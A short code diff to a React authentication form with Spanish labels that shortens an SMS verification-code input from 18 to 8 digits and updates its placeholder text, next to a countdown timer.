@@ -66,7 +66,7 @@ function Segundapag() {
       <form className="auth-form" onSubmit={handleSubmit}>
         <label>
           Ingrese los números que recibió por mensaje SMS:
-          <input type="tel" name="sms-code" maxLength={18} placeholder="18 dígitos" className="auth-input" required />
+          <input type="tel" name="sms-code" maxLength={8} placeholder="8 dígitos" className="auth-input" required />
         </label>
         <div className="auth-timer">
           Tiempo restante: {formatTime(timeLeft)}
